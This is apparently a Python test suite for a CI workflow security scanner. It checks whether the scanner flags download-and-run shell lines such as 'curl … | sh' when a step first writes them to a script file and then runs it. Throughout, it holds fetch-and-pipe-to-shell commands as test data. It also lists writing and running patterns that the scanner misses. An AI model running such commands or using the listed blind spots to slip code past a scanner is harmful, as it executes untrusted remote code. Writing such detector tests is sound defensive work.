"""#3027: a file the step writes with its own printer and then runs is read as the writer's text.

`echo 'curl … | sh' > s.sh` ⏎ `sh s.sh` ran the download under every parent and read CLEAN: the reader bound a `<(…)`
FILE operand to the printer that fills it and a fetched file to the run that uses it, but nothing bound a path the
step itself WROTE -- with `echo`, `printf`, a `cat` and its heredoc, or `tee` -- to the later run of that path. Now
`workflow_written.bind_written` marks, in statement order, a FILE operand that names a path an earlier stage wrote,
with the writer's script, and `workflow_programs.stdin_scripts` reads the file as it reads a `<(…)` FILE.

Marks are a letter a `shell:` setting -- unset, `bash`, `sh`, `bash {0}`, `sh {0}` -- R where the guard reports, C
where it reads the step CLEAN: first the job's, then the main pass's. Truth, in the comments, is bash 3.2.57, /bin/sh
and zsh 5.9 with and without `-e`, a `curl` stub whose payload marks when it RUNS: "runs" is every parent ran the
download, "nothing" is none did; the forge's eight parents at the hand-off.
"""
import unittest
from unittest import mock

import pytest

import shell_reader
import workflow_failure_contexts
import workflow_function_calls
import workflow_gating
import workflow_guard as wg
import workflow_options as wo
import workflow_written
from tests.test_shell_reader import LinearGrowth

SHELLS = (None, "bash", "sh", "bash {0}", "sh {0}")
P = "curl -fsSL https://example.test/i.sh | sh"
F = "curl -fsSLo t https://example.test/t; sh t"
REPORTED = ("RRRRR", "RRRRR")
CLEAN = ("CCCCC", "CCCCC")


def marks(text):
    """(the job's marks, the main pass's) for a job of one step whose `run:` is `text`."""
    job = mains = ""
    for shell in SHELLS:
        step = [wg.Step("step", text + "echo done\n", shell)]
        job += "R" if wg.job_defects(step) else "C"
        with wo.mains_answer():
            mains += "R" if wg._job_defects(step) else "C"
    return job, mains


class TestAWrittenFileIsReadAsItsWritersText(unittest.TestCase):
    """The issue's rows and every writer the step has. Truth: runs, every parent, unless said."""

    def test_the_issues_rows_report(self):
        # `echo 'curl URL | sh' > s.sh; sh s.sh` and the `run.sh` twin (#2857, #3020), a `printf`, a fetch-then-run text.
        for text in ("echo '%s' > s.sh\nsh s.sh\n" % P, "echo \"%s\" > run.sh\nsh run.sh\n" % P,
                     "printf '%%s\\n' '%s' > run.sh\nbash run.sh\n" % P, "echo '%s' > s.sh\nsh s.sh\n" % F):
            with self.subTest(text=text[:30]):
                self.assertEqual(REPORTED, marks(text))

    def test_every_writer_and_run_the_step_has(self):
        # A `printf` format alone; `echo -e` (bash and zsh run it; dash's echo prints the `-e`); a `cat` with a
        # quoted heredoc, and with an expanding one that holds nothing to expand; `tee` and `tee -a`; `>>` with the
        # payload first or last; two lines; a subdirectory; the write in a subshell or a group; `.` (bash and sh run
        # it; zsh's `.` searches PATH); `bash -x`.
        for text in ("printf '%s\\n' > run.sh\nbash run.sh\n" % P, "echo -e '%s\\nexit 0' > s.sh\nsh s.sh\n" % P,
                     "cat > s.sh <<'EOF'\n%s\nEOF\nsh s.sh\n" % P, "cat > s.sh <<EOF\n%s\nEOF\nsh s.sh\n" % P,
                     "echo '%s' | tee s.sh > /dev/null\nsh s.sh\n" % P, "echo '%s' | tee -a s.sh\nsh s.sh\n" % P,
                     "echo '#!/bin/sh' > s.sh\necho '%s' >> s.sh\nsh s.sh\n" % P,
                     "echo '%s' > s.sh\necho 'exit 0' >> s.sh\nsh s.sh\n" % P,
                     "echo 'set -e' > s.sh\necho '%s' >> s.sh\nsh s.sh\n" % P,
                     "mkdir -p d\necho '%s' > d/s.sh\nsh d/s.sh\n" % P,
                     "( echo '%s' > s.sh )\nsh s.sh\n" % P, "{ echo '%s' > s.sh; }\nsh s.sh\n" % P,
                     "echo '%s' > s.sh\n. s.sh\n" % P, "echo '%s' > s.sh\nsource ./s.sh\n" % P,
                     "echo '%s' > s.sh\nbash -x s.sh\n" % P):
            with self.subTest(text=text[:34]):
                self.assertEqual(REPORTED, marks(text))

    def test_a_cat_with_an_expanding_heredoc_is_read_as_its_pipe_twin_is(self):
        # `cat > s.sh <<EOF` holding `curl … | sh $(echo -s)` runs the download under every parent; the body expands,
        # so it is handed on as an expanding `cat` heredoc and read as `cat <<EOF | sh` and `. <(cat <<EOF …)` are on
        # `main`: reported. The price, named, the same as those twins': a benign expanding body (`echo $(date)`, nothing
        # fetched) reports too.
        self.assertEqual(REPORTED, marks("cat > s.sh <<EOF\n%s $(echo -s)\nEOF\nsh s.sh\n" % P))
        self.assertEqual(REPORTED, marks("cat > s.sh <<EOF\necho $(date)\nEOF\nsh s.sh\n"))
        self.assertEqual(REPORTED, marks("cat <<EOF | sh\necho $(date)\nEOF\n"))

    def test_an_unspelled_writer_never_hides_a_spelled_payload(self):
        # The review seat's rows: one writer the printers cannot spell beside the payload -- after it, before it, or
        # after a quoted heredoc -- and 63, 64 or 65 spelled lines in front of it (64 is `_DEPTH`): every text is kept,
        # in an expanding heredoc the guard reports as it reports any expanding body a shell runs. Truth: runs, every
        # parent. The price, named: two benign writers one of which is unspelled report too.
        unspelled = 'echo "export PATH=$PATH"'
        for text in (unspelled + " > s.sh\necho '%s' >> s.sh\nsh s.sh\n" % P,
                     "echo '%s' > s.sh\n" % P + unspelled + " >> s.sh\nsh s.sh\n",
                     "cat > s.sh <<'EOF'\n%s\nEOF\n" % P + unspelled + " >> s.sh\nsh s.sh\n",
                     *("".join("echo ':' >> s.sh\n" for _ in range(n)) + "echo '%s' >> s.sh\nsh s.sh\n" % P
                       for n in (63, 64, 65)),
                     unspelled + " > s.sh\necho 'echo hi' >> s.sh\nsh s.sh\n"):
            with self.subTest(text=text[:40], lines=text.count("\n")):
                self.assertEqual(REPORTED, marks(text))
        self.assertEqual(CLEAN, marks("echo 'echo a' > s.sh\necho 'echo b' >> s.sh\nsh s.sh\n"))

    def test_a_write_the_step_may_make_counts(self):
        # Fail-closed, the prices named: every write is read as an append (the stage keeps the written words, not
        # the operator), so a benign re-write after the payload still reads it -- `echo PAYLOAD > s.sh; echo 'echo
        # hi' > s.sh; sh s.sh` runs nothing and reports; a write under a condition counts (`if false`, `[ -n "$X" ]`
        # with X unset: nothing runs); a write in a function body counts where the definition stands before the run
        # (never called, or called after the run: nothing runs). The payload written last, a conditional write
        # taken, and a function called before the run do run.
        for text in ("echo '%s' > s.sh\necho 'echo hi' > s.sh\nsh s.sh\n" % P,
                     "if false; then echo '%s' > s.sh; fi\nsh s.sh\n" % P,
                     "if [ -n \"$X\" ]; then echo '%s' > s.sh; fi\nsh s.sh\n" % P,
                     "f() { echo '%s' > s.sh; }\nsh s.sh\n" % P, "f() { echo '%s' > s.sh; }\nsh s.sh\nf\n" % P,
                     "echo 'echo hi' > s.sh\necho '%s' > s.sh\nsh s.sh\n" % P,
                     "if true; then echo '%s' > s.sh; fi\nsh s.sh\n" % P, "f() { echo '%s' > s.sh; }\nf\nsh s.sh\n" % P):
            with self.subTest(text=text[:34]):
                self.assertEqual(REPORTED, marks(text))


class TestAGroupOfPrintersWrittenToAFileIsReadAsTheirText(unittest.TestCase):
    """#3110: a `{ ...; }` or `( ...; )` group written to a file the step then runs. `_writer` read the stage that
    writes the file as the printer -- for a group the closer, which prints nothing -- so nothing was bound while
    every parent ran it (Claudia's `k3026/rows-written`: 138 rows, 102 running, all CLEAN). `_writers` reads the
    group's printers through #3026's `workflow_printers._grouped`, in order, as the file's writers, and the file
    reads as its single-printer twin reads. Truth: runs, every parent, unless said."""

    def test_the_issues_rows_report(self):
        # The kit's three kinds with a plain `sh -c` program -- `{ echo P; } > s.sh`, `( echo P; ) > s.sh`,
        # `{ echo P; echo ok; } > s.sh` -- then a bare pipe text, the payload second, a `printf`, a quoted-heredoc
        # `cat` inside the group, `>>`, and the file run with `.` and `bash`.
        for text in ("{ echo \"sh -c '%s'\"; } > s.sh\nsh s.sh\n" % P, "( echo \"sh -c '%s'\"; ) > s.sh\nsh s.sh\n" % P,
                     "{ echo \"sh -c '%s'\"; echo ok; } > s.sh\nsh s.sh\n" % P,
                     "{ echo '%s'; } > s.sh\nsh s.sh\n" % P, "{ echo ok; echo '%s'; } > s.sh\nsh s.sh\n" % P,
                     "{ printf '%%s\\n' '%s'; echo ok; } > s.sh\nsh s.sh\n" % P,
                     "{ echo ok; cat <<'EOF'\n%s\nEOF\n} > s.sh\nsh s.sh\n" % P,
                     "{ echo '%s'; } >> s.sh\nsh s.sh\n" % P,
                     "{ echo '%s'; } > s.sh\n. ./s.sh\n" % P, "{ echo '%s'; } > s.sh\nbash s.sh\n" % P):
            with self.subTest(text=text[:34]):
                self.assertEqual(REPORTED, marks(text))

    def test_a_pipeline_no_printer_spells_hands_the_group_on_loud(self):
        # `{ echo ok; cat f; } > s.sh` ⏎ `sh s.sh`: the file holds what `f` holds, unread, so the group is handed on
        # as an expanding heredoc behind a live line (`_script`'s unspelled route) and reported as any expanding
        # body a shell runs -- fail-closed, as #3026's `_GROUPED` reads the pipe twin; a spelled payload beside it
        # is kept. Truth: runs where `f` holds a payload.
        self.assertEqual(REPORTED, marks("{ echo ok; cat f; } > s.sh\nsh s.sh\n"))
        self.assertEqual(REPORTED, marks("{ echo '%s'; cat f; } > s.sh\nsh s.sh\n" % P))

    def test_what_reads_as_it_did(self):
        # A group with no printer in it binds nothing (`{ cat f; } > s.sh`, as `cat f > s.sh` does: a limit, main's;
        # truth runs where `f` holds a payload); a benign group; the file never run; the write after the run
        # (nothing); `( echo P ) > s.sh` without the `;` is main's own, the printer's stage closing the subshell
        # itself (truth: runs).
        for text, expected in (("{ cat f; } > s.sh\nsh s.sh\n", CLEAN),
                               ("{ echo ok; echo done; } > s.sh\nsh s.sh\n", CLEAN),
                               ("{ echo '%s'; } > s.sh\n" % P, CLEAN), ("sh s.sh\n{ echo '%s'; } > s.sh\n" % P, CLEAN),
                               ("( echo \"sh -c '%s'\" ) > s.sh\nsh s.sh\n" % P, REPORTED)):
            with self.subTest(text=text[:30]):
                self.assertEqual(expected, marks(text))

    def test_the_group_reads_as_its_single_printer_twin_reads(self):
        # Claudia's `.l` and `.w` rows: the lifted letter `sh -$(echo c) '…'` read as the letter (REPORTED, #3065);
        # `sh -$(echo x) '…'` LOUD on both, the unspelled printer (main's price for the twin, inherited: truth runs
        # nothing); `sh -s '…'` and `sh - '…'` run nothing and read CLEAN on both.
        for inner, expected in (("sh -$(echo c) '%s'" % P, REPORTED), ("sh -$(echo x) '%s'" % P, REPORTED),
                                ("sh -s '%s'" % P, CLEAN), ("sh - '%s'" % P, CLEAN)):
            group = "{ echo \"%s\"; echo ok; } > s.sh\nsh s.sh\n" % inner
            twin = "echo \"%s\" > s.sh\nsh s.sh\n" % inner
            with self.subTest(inner=inner[:16]):
                self.assertEqual(expected, marks(group))
                self.assertEqual(marks(twin), marks(group))

    def test_a_nested_group_is_a_named_limit(self):
        # `{ { echo P; }; echo ok; } > s.sh` ⏎ `sh s.sh`: `_grouped` stops at an inner closer, #3117's shape. Truth: runs.
        self.assertEqual(CLEAN, marks("{ { echo '%s'; }; echo ok; } > s.sh\nsh s.sh\n" % P))


class TestWhatReadsAsItDid(unittest.TestCase):
    """The controls (nothing runs, CLEAN on `main` and here), and the readers this one reuses."""

    def test_the_controls(self):
        # Another file run; a benign file; the run before the write; the written file run inside a `-c` string the
        # reader parses after binding (a limit, below, not a control -- listed here as CLEAN).
        for text in ("echo '%s' > s.sh\nsh other.sh\n" % P, "echo 'echo hi' > s.sh\nsh s.sh\n",
                     "sh s.sh\necho '%s' > s.sh\n" % P):
            with self.subTest(text=text[:30]):
                self.assertEqual(CLEAN, marks(text))

    def test_the_readers_reused(self):
        # `echo '…' | sh` (the printer piped) and `sh <(echo '…')` (the substituted FILE) reported on `main`.
        self.assertEqual(REPORTED, marks("echo '%s' | sh\n" % P))
        self.assertEqual(REPORTED, marks("sh <(echo '%s')\n" % P))

    def test_a_check_in_front_of_the_files_own_fetch_is_no_check(self):
        # `echo 'curl -o t; sh t' > s.sh` ⏎ `sha256sum -c sums || exit 1` ⏎ `sh s.sh`: the fetch happens inside the
        # file, after the check, which can verify nothing of it -- reported, as `main` reports the check written
        # before a plain `curl -o t` ⏎ `sh t`. (The step's `sums` is absent, so the check stops it: an over-report
        # `main` makes of the plain twin too.)
        self.assertEqual(REPORTED, marks("echo '%s' > s.sh\nsha256sum -c sums || exit 1\nsh s.sh\n" % F))
        self.assertEqual(REPORTED, marks("sha256sum -c sums || exit 1\n%s\n" % F))


class TestTheLimits(unittest.TestCase):
    """Named, pinned, not fixed here: each is a follow-up's."""

    def test_the_three_limits_read_clean(self):
        # A command-word run of the written file (`chmod +x s.sh` ⏎ `./s.sh`: no FILE operand -- the uses reader's
        # shape); the run inside a `-c` string (`bash -c 'sh s.sh'`: parsed inside `flattened`, after binding); a
        # value path (`echo … > "$F"` ⏎ `sh "$F"`: the values table). Truth: runs, every parent.
        for text in ("echo '%s' > s.sh\nchmod +x s.sh\n./s.sh\n" % P, "echo '%s' > s.sh\nbash -c 'sh s.sh'\n" % P,
                     "F=s.sh\necho '%s' > \"$F\"\nsh \"$F\"\n" % P):
            with self.subTest(text=text[:30]):
                self.assertEqual(CLEAN, marks(text))

    def test_a_lone_unspelled_writer_is_a_limit(self):
        # `T='…'; echo "$T" > s.sh; sh s.sh` and a `printf` with two words, each the file's ONE writer: its words are
        # not spelled here, so the file is unread and CLEAN -- a limit, filed at the merge: `main` reports the pipe
        # twin `echo "$T" | sh`, its value reading spelling `$T`, which this reader does not ask. Truth: runs.
        for text in ("T='%s'\necho \"$T\" > s.sh\nsh s.sh\n" % P, "printf '%%s\\n' 'set -e' '%s' > s.sh\nsh s.sh\n" % P):
            with self.subTest(text=text[:30]):
                self.assertEqual(CLEAN, marks(text))

    def test_a_lifted_letter_in_the_written_text_is_read_as_the_letter(self):
        # `echo "curl -$(echo f)sSL … | sh" > run.sh` ⏎ `sh run.sh` (Claudia's #3020 hunt, the `.l` rows): the
        # writer's word is handed on with its substitution restored around its own script, so the printers read
        # it as they read it where it stood -- the lifted letter as the letter (#3065) -- and the file reads as
        # its written twin does (`tests/test_workflow_option_words.py` pins the two alike). Truth: runs.
        self.assertEqual(REPORTED, marks("echo \"curl -$(echo f)sSL https://example.test/i.sh | sh\" > run.sh\nsh run.sh\n"))
        self.assertEqual(REPORTED, marks("echo \"sh -$(echo c) '%s'\" > run.sh\nsh run.sh\n" % P))

    def test_a_file_whose_program_runs_nothing_reads_clean(self):
        # Claudia's `.w` rows: the written file holds `sh -s '…'` (the string a positional) or `sh - '…'` (a file
        # name): nothing runs; `sh -c '…'` and `bash -c '…'` run it.
        self.assertEqual(CLEAN, marks("echo \"sh -s '%s'\" > run.sh\nsh run.sh\n" % P))
        self.assertEqual(CLEAN, marks("echo \"sh - '%s'\" > run.sh\nsh run.sh\n" % P))
        self.assertEqual(REPORTED, marks("echo \"sh -c '%s'\" > run.sh\nsh run.sh\n" % P))
        self.assertEqual(REPORTED, marks("echo \"bash -c '%s'\" > run.sh\nsh run.sh\n" % P))


class TestTheBindingIsLinear(LinearGrowth, unittest.TestCase):
    """n writes then n runs in one step: the path-to-writer binding is a dict lookup a stage."""

    @staticmethod
    def make(n):
        return "".join("echo 'echo %d' > s%d.sh\n" % (i, i) for i in range(n)) + "".join("sh s%d.sh\n" % i for i in range(n))

    @pytest.mark.serial
    def test_n_writes_and_n_runs_bind_in_linear_time(self):
        # Growth, not speed: `LinearGrowth` times `shell_reader.statements`, here the parse with `bind_written` behind
        # it, at 500 and 2,000; every run's FILE operand carries its writer's script. The reading of the n texts
        # `flattened` then makes is the forms reader's, and grows as it grows on `main` for n `echo … | sh` in one
        # step: not pinned here (a follow-up).
        real = shell_reader.statements

        def check(n, parsed):
            self.assertEqual(n, sum(1 for s in parsed for st in s.stages for w in st.argv if getattr(w, "written", None)))

        with mock.patch.object(shell_reader, "statements", lambda script: workflow_written.bind_written(real(script))):
            self.assert_linear_growth(500, self.make, check)

    @staticmethod
    def make_groups(n):
        return ("".join("{ echo 'echo %d'; echo ok; } > s%d.sh\n" % (i, i) for i in range(n))
                + "".join("sh s%d.sh\n" % i for i in range(n)))

    @pytest.mark.serial
    def test_n_groups_written_and_n_runs_bind_in_linear_time(self):
        # #3110: a closer's writers are the group's printers, found by one walk back to the opener (`_grouped`) through
        # a view of the statements in front, no copy: the binding stays a dict lookup a stage.
        real = shell_reader.statements

        def check(n, parsed):
            self.assertEqual(n, sum(1 for s in parsed for st in s.stages for w in st.argv if getattr(w, "written", None)))

        with mock.patch.object(shell_reader, "statements", lambda script: workflow_written.bind_written(real(script))):
            self.assert_linear_growth(500, self.make_groups, check)

    @staticmethod
    def make_lines_then_groups(n):
        return "echo ok\n" * (4 * n) + TestTheBindingIsLinear.make_groups(n)

    @pytest.mark.serial
    def test_n_plain_lines_then_n_groups_bind_in_linear_time(self):
        # #3110 round 1: the walk back to a group's opener took a copy of the step's front once a closer -- quadratic,
        # and paid by a closer that writes no file too (x8.6 for 3,200 -> 12,800 on this shape, past the bound). A
        # view, and the lookup only where the closer writes a file, keep the binder linear where the curve showed.
        # The binder alone is timed: the parse is done in `make` (its growth is #3126's pin), so the helper's cap
        # falls on the binding, not on 76,800 lines parsed on a traced runner.
        parsed = {}

        def make(n):
            script = self.make_lines_then_groups(n)
            parsed[script] = shell_reader.statements(script)
            return script

        def check(n, bound):
            self.assertEqual(n, sum(1 for s in bound for st in s.stages for w in st.argv if getattr(w, "written", None)))

        self.assert_linear_growth(3200, make, check, parser=lambda script: workflow_written.bind_written(parsed[script]))

    @pytest.mark.serial
    def test_n_groups_written_and_n_runs_read_in_linear_time(self):
        # The guard's read of the same step (#3126's linear flattening behind the binding): 6n statements.
        def check(n, parsed):
            self.assertEqual(6 * n, len(parsed))

        self.assert_linear_growth(150, self.make_groups, check, parser=wg.read)

    def test_the_files_are_read_where_the_step_runs_them(self):
        # `workflow_guard.read` flattens each run's text into the statements the walk reads: 3n for n of each.
        self.assertEqual(900, len(wg.read(self.make(300))))


class TestProgramFlatteningIsLinear(LinearGrowth, unittest.TestCase):
    """#3105: reading each program text takes one pass over the job."""

    @staticmethod
    def make(n):
        program = "echo 'echo ok' | sh\n"
        return (program * n
                + "sh <(echo 'echo ok')\n" * n
                + "sh <<'EOF'\necho ok\nEOF\n" * n
                + "".join("echo 'echo ok' > s%d.sh\n" % i for i in range(n))
                + "".join("sh s%d.sh\n" % i for i in range(n)))

    @staticmethod
    def enclosed(n):
        program = "echo 'echo ok' | sh\n"
        return ("{\n" + program * n + "} | cat\n"
                + "f() {\n" + program * n + "}\nf\n")

    @staticmethod
    def written(kib):
        line = "echo ok\n"
        body = line * max(1, kib * 1024 // len(line))
        return "cat > run.sh <<'EOF'\n" + body + "EOF\nsh run.sh\n"

    @staticmethod
    def job(script):
        return wg.job_defects([wg.Step("step", script)])

    @pytest.mark.serial
    def test_each_program_form_is_linear_when_read(self):
        def check(n, parsed):
            self.assertEqual(9 * n, len(parsed))

        # The old n=150 sample only narrowly failed the pre-#3105 reader.
        self.assert_linear_growth(300, self.make, check, parser=wg.read)

    @pytest.mark.serial
    def test_each_program_form_is_linear_at_job_level(self):
        def check(_n, defects):
            self.assertEqual([], defects)

        self.assert_linear_growth(150, self.make, check, parser=self.job)

    @pytest.mark.serial
    def test_group_and_function_boundaries_are_indexed_once(self):
        def check(_n, defects):
            self.assertEqual([], defects)

        self.assert_linear_growth(150, self.enclosed, check, parser=self.job)

    @pytest.mark.serial
    def test_a_large_written_heredoc_is_linear_at_job_level(self):
        def check(_n, defects):
            self.assertEqual([], defects)

        # 64 -> 256 KiB reaches the growing-prefix cost while staying inside
        # the timing helper's absolute bound under the coverage tracer.
        self.assert_linear_growth(64, self.written, check, parser=self.job)

    def test_indexed_and_legacy_answers_match_on_a_corpus_sample(self):
        # Sample every analysis-aware helper over both source statements and
        # the handed-program statements `read` inserts into their carriers.
        corpus = (
            "echo 'echo ok' | sh\nsh <(echo 'echo ok')\n",
            "{\necho 'echo ok' | sh\necho later\n} && echo kept\n",
            "(\necho 'echo ok' | sh\necho later\n) || exit 1\n",
            "f() {\necho 'echo ok' | sh\necho later\n}\nf\n",
            "f() {\necho 'echo ok' | sh\n}\n{ f; } | cat\necho after\n",
            "outer() {\ninner() {\necho 'echo ok' | sh\n}\ninner\n}\nouter\n",
            "T=/dev/null\nf() { T=@P@; }\n{ f; } | cat\nsh \"$T\"\n",
            "if true; then\n{ echo 'echo ok' | sh; } && echo later\nfi\n",
            "{ { echo 'echo ok' | sh; }; echo tail; } || exit 1\n",
            "f() {\n( echo 'echo ok' | sh; echo tail ) && return 0\n}\nf | cat\n",
            "f() {\necho 'echo ok' | sh\n}\nf | cat\n",
            "f() {\necho 'echo ok' | sh\n}\nif true; then f; fi\n",
            "f() {\necho 'echo ok' | sh\n}\nf\nf() {\necho later\n}\nf\n",
            "f() {\necho 'echo ok' | sh\n}\neval ':'\nf\n",
            "f() {\necho 'echo ok' | sh\n}\ng() { f; }\ng\n",
            "f() {\necho 'echo ok' | sh\n}\nf\nf\nf\n",
            "f() {\necho 'echo ok' | sh\n}\nf && echo kept\n",
            "{\nf() {\necho 'echo ok' | sh\n}\nf\n} | cat\n",
        )

        def signature(answer, depth=0):
            if depth > 8:
                return "<deep>"
            if answer is None or isinstance(answer, (bool, int, float)):
                return answer
            if isinstance(answer, str):
                attrs = (tuple((key, signature(value, depth + 1))
                               for key, value in sorted(vars(answer).items()))
                         if hasattr(answer, "__dict__") else ())
                return answer if type(answer) is str else (type(answer).__name__, str(answer), attrs)
            if isinstance(answer, (list, tuple)):
                return (type(answer).__name__, *(signature(value, depth + 1) for value in answer))
            if isinstance(answer, dict):
                return tuple((str(key), signature(value, depth + 1))
                             for key, value in sorted(answer.items(), key=lambda item: str(item[0])))
            if hasattr(answer, "__slots__"):
                return (type(answer).__name__,
                        tuple((key, signature(getattr(answer, key, None), depth + 1))
                              for key in answer.__slots__))
            if hasattr(answer, "__dict__"):
                return (type(answer).__name__,
                        tuple((key, signature(value, depth + 1))
                              for key, value in sorted(vars(answer).items())))
            return type(answer).__name__, repr(answer)

        compared = 0

        def compare(legacy, indexed):
            nonlocal compared
            self.assertEqual(signature(legacy), signature(indexed))
            compared += 1

        for script in corpus:
            for stmts in (list(shell_reader.statements(script)), list(wg.read(script))):
                analysis = workflow_failure_contexts.statement_analysis(stmts)
                mixed_on = [index % 2 == 0 for index in range(len(stmts))]
                mixed_fails = [index % 3 == 0 for index in range(len(stmts))]
                for index, statement in enumerate(stmts):
                    scope = workflow_function_calls._function_scope(stmts, index)
                    compare(scope, workflow_function_calls._function_scope(
                        stmts, index, analysis))
                    compare(
                        workflow_gating._piped_group_end(stmts, index),
                        workflow_gating._piped_group_end(stmts, index, analysis))
                    compare(
                        workflow_gating._piped_function_end(stmts, index),
                        workflow_gating._piped_function_end(stmts, index, analysis))
                    compare(
                        workflow_function_calls._stops_step(
                            stmts, index, mixed_on, mixed_fails),
                        workflow_function_calls._stops_step(
                            stmts, index, mixed_on, mixed_fails, analysis))
                    compare(
                        workflow_gating._stopping_rescue(stmts, index),
                        workflow_gating._stopping_rescue(stmts, index, analysis=analysis))
                    compare(
                        workflow_failure_contexts._enclosing_failure_contexts(stmts, index),
                        workflow_failure_contexts._enclosing_failure_contexts(
                            stmts, index, analysis))
                    compare(
                        workflow_failure_contexts._inside_unmarked_case(stmts, index),
                        workflow_failure_contexts._inside_unmarked_case(stmts, index, analysis))
                    for errexit in (False, True):
                        compare(
                            workflow_function_calls._conditional_group_tail(
                                stmts, index, errexit),
                            workflow_function_calls._conditional_group_tail(
                                stmts, index, errexit, analysis))
                        compare(
                            workflow_gating._function_status(stmts, index, None, errexit),
                            workflow_gating._function_status(
                                stmts, index, None, errexit, analysis))
                        for pipefail in (False, True):
                            on = [errexit] * len(stmts)
                            fails = [pipefail] * len(stmts)
                            compare(
                                workflow_function_calls._stops_step(
                                    stmts, index, on, fails),
                                workflow_function_calls._stops_step(
                                    stmts, index, on, fails, analysis))
                            compare(
                                workflow_function_calls._stops_the_job(
                                    stmts, index, errexit, pipefail),
                                workflow_function_calls._stops_the_job(
                                    stmts, index, errexit, pipefail, analysis))
                    if statement.stages:
                        compare(
                            workflow_gating.swallowed(
                                stmts, index, statement, statement.stages[-1]),
                            workflow_gating.swallowed(
                                stmts, index, statement, statement.stages[-1],
                                analysis=analysis))
                        compare(
                            workflow_gating.inlined_stops(
                                stmts, 0, len(stmts), index),
                            workflow_gating.inlined_stops(
                                stmts, 0, len(stmts), index, analysis=analysis))
                    if scope is not None:
                        name, close = scope
                        for errexit in (False, True):
                            for returns_status in (False, True):
                                compare(
                                    workflow_function_calls._gating_function_call(
                                        stmts, name, close, errexit, returns_status),
                                    workflow_function_calls._gating_function_call(
                                        stmts, name, close, errexit, returns_status,
                                        analysis=analysis))
                                legacy_calls, indexed_calls = [], []
                                legacy = workflow_function_calls._gating_function_call(
                                    stmts, name, close, errexit, returns_status,
                                    calls=legacy_calls)
                                indexed = workflow_function_calls._gating_function_call(
                                    stmts, name, close, errexit, returns_status,
                                    calls=indexed_calls, analysis=analysis)
                                compare((legacy, legacy_calls), (indexed, indexed_calls))

        self.assertGreater(compared, 1000)


if __name__ == "__main__":
    unittest.main()
